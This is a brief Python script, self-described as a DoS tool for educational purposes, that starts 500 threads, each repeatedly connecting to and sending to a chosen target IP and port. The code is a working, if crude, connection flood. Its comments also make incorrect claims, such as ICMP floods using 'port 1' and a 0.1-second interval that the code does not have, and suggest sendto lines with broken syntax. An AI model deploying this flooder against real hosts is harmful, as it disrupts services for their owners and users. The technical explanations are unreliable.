# Hello, this is made by Amein Almoughrabi! :)
# This is a simple script to send packets to a target IP and port
# It is made to be used as a DoS tool
# It is not meant to be used as a tool for attacking websites or anything malicious
# It is meant to show an understanding of how this can be done and purely for educational purposes



import threading
# to run multiple threads
import socket
# to connect

# Note:
# While python doesn't support real multi-threading, we can use threading module and simulate it

target = ""
port = 0
# Can also specify fake ip address in the header
fake_ip = "", # Note: this is not exactly the safest way to do it


# target can be domain name or ip address
# Depending on the port number, we can use different types of attacks
    # For example, if we want to use SYN flood attack, we can use port 80, port 21, port 22, etc., which is open for web servers like http
    # If we want to use UDP flood attack, we can use port 53, which is DNS
    # If we want to use ICMP flood attack, we can use port 1, which is ICMP protocol
    # If we want to use TCP SYN-ACK flood attack, we can use port 22, which is the default port for SSH

# defning method 
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # s is the socket object
        # AF_INET is the address family, which is IPv4 and creates new internet socket
        # Socket.SOCK_STREAM is the type of socket, which is TCP

        s.connect((target, port))
        # connect to the target

        s.sendto(b"", (target, port))
        # send data to the target (b"") is the data to be sent

        # can use:
        # s.sendto("GET / HTTP/1.1\r\nHost: google.com\r\n\r\n", encode("utf-8"), (target, port)
            # Get the target specified as HTTP, encode it, and send it to the target on the port specified

        # s.sendto("Host: google.com\r\n\r\n", encode("utf-8"), (target, port))
            # to send HTTP request using fake ip address
                
        # encode("utf-8") is the encoding method, which is used to convert string to bytes
        # Note: if we don't use encode("utf-8"), it will not work

        s.close()
        # close the socket connection

        # Basically we are sending the same packet to the target every 0.1 seconds
        # connect send close over and over again

# Now to run in multiple threads

for i in range(500):
    thread = threading.Thread(target=attack)
    # now it is the target function not to be confued with the attack function
    thread.start()
    # start the thread


# if you want to check the script you print the numbers by using a if statement like this:
#
#  if already_sent % 100 == 0:
#     print(already_sent)
# 
# this will print the number of packets sent every 100 packets for your reference
